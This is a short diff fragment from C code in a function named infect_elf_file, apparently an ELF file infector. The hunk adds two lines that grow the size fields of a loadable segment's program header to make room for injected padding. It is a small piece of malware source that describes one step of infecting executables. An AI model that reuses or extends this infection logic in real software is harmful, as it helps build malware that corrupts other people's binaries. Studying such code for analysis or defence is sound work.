@@ -469,6 +469,8 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 			if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags && PF_R && infext_PF_R){
 				phdr[i].p_vaddr -= paddingSize;
 				phdr[i].p_paddr -= paddingSize;
+				phdr[i].p_filesz += paddingSize;
+				phdr[i].p_memsz += paddingSize;
 				infext_PF_R=0;
 			}
 		}
